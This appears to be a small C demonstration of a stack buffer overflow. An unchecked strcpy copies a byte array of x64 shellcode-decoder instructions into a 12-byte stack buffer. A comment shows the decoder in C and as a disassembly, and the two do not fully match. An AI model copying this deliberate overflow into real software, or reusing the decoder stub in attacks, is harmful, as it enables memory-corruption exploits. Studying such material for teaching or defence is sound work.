#include <stdio.h>
#include <string.h>

#pragma warning(disable:4996)

void CopyString(char* pdst,const char* psrc)
{
	strcpy(pdst,psrc);
	return;
}


/*****************************************************

code for this
int decode_buffer(unsigned char* pinbuf,int inlen,unsigned char* poutbuf,int outlen)
{
	int cnt=0;
	int i;
	unsigned char* pin=pinbuf,*pout =poutbuf;

	for (i=0;i<inlen;i++,cnt ++,pin ++ ,pout ++)
	{
		if (*pin == 0x1)
		{
			i ++;
			pin ++;
			if (*pin == 0x2)
			{
				*pout = 0x0;
			}
			else
			{
				*pout = 0xff;
			}
		}
		else
		{
			*pout = *pin;
			(*pout) -- ;
		}
	}
	return cnt;
}


 56                 push        rsi
 57                 push        rdi
 53                 push        rbx
 51                 push        rcx
 52                 push        rdx
 48 33 F6           xor         rsi,rsi
 48 33 FF           xor         rdi,rdi
 48 33 DB           xor         rbx,rbx
 48 33 C0           xor         rax,rax
 8B F1              mov         esi,ecx
 49 8B F8           mov         rdi,r8
 8B CA              mov         ecx,edx
 48 33 D2           xor         rdx,rdx
 8A 06              mov         al,byte ptr [rsi]
 3C 01              cmp         al,1
 75 15              jne         0000000140001276
 48 FF C6           inc         rsi
 48 FF C9           dec         rcx
 8A 06              mov         al,byte ptr [rsi]
 3C 01              cmp         al,1
 75 05              jne         0000000140001272
 C6 07 FF           mov         byte ptr [rdi],0FFh
 EB 08              jmp         000000014000127A
 88 1F              mov         byte ptr [rdi],bl
 EB 04              jmp         000000014000127A
 FE C8              dec         al
 88 07              mov         byte ptr [rdi],al
 48 FF C7           inc         rdi
 48 FF C6           inc         rsi
 48 FF C2           inc         rdx
 48 FF C9           dec         rcx
 3B CB              cmp         ecx,ebx
 75 D1              jne         000000014000125B
 48 8B C2           mov         rax,rdx
 5A                 pop         rdx
 59                 pop         rcx
 5B                 pop         rbx
 5F                 pop         rdi
 5E                 pop         rsi

******************************************************/


char st_shell[] = {


 /***************************************************
 this is code for decode buffer code
 ***************************************************/
 0x56,0x57,0x53,0x51,0x52,0x48,0x33,0xF6,0x48,0x33,0xFF,0x48,0x33,0xDB,0x48,0x33
,0xC0,0x8B,0xF1,0x49,0x8B,0xF8,0x8B,0xCA,0x48,0x33,0xD2,0x8A,0x06,0x3C,0x01,0x75
,0x15,0x48,0xFF,0xC6,0x48,0xFF,0xC9,0x8A,0x06,0x3C,0x01,0x75,0x05,0xC6,0x07,0xFF
,0xEB,0x08,0x88,0x1F,0xEB,0x04,0xFE,0xC8,0x88,0x07,0x48,0xFF,0xC7,0x48,0xFF,0xC6
,0x48,0xFF,0xC2,0x48,0xFF,0xC9,0x3B,0xCB,0x75,0xD1,0x48,0x8B,0xC2,0x5A,0x59,0x5B
,0x5F,0x5E
};

int main(int argc ,char* argv[])
{
	char dst[12];
	CopyString(dst,st_shell);
	return 0;
}